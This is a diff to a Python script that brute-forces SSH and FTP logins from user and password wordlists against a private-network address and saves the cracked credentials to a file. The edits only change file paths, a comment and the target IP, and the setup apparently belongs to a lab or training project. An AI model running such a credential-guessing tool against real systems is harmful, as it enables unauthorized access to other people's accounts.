@@ -18,7 +18,7 @@ def ssh_brute_force(ip, port, user, passwd):
         print("SSH connection error")
     else:
         print(f"Password found: {user}:{passwd}")
-        with open("ssh_found", 'a') as f_found:
+        with open("../ssh_found", 'a') as f_found:
             f_found.write(f"{ip}:{port} - {user}:{passwd}\n")
             f_found.flush()
     finally:
@@ -42,7 +42,7 @@ def ftp_brute_force(ip, port, user, passwd):
             f_found.write(f"{ip}:{port} - {user}:{passwd}\n")
             f_found.flush()
     finally:
-        server.close()  # ✅ always close the connection
+        server.close()
 
 if __name__ == "__main__":
     arg_parser = argparse.ArgumentParser()
@@ -52,9 +52,9 @@ if __name__ == "__main__":
     arg_parser.add_argument("-p", "--protocol", help="protocol to use for the attack", required=True)
     args = arg_parser.parse_args()
 
-    userlist = "userlist.txt"
-    passlist = "password.txt"
-    target = "192.168.2.6"
+    userlist = "attacks/utilities/userlist.txt"
+    passlist = "attacks/utilities/password.txt"
+    target = "10.12.0.10"
 
     if args.filepath:
         passlist = args.filepath
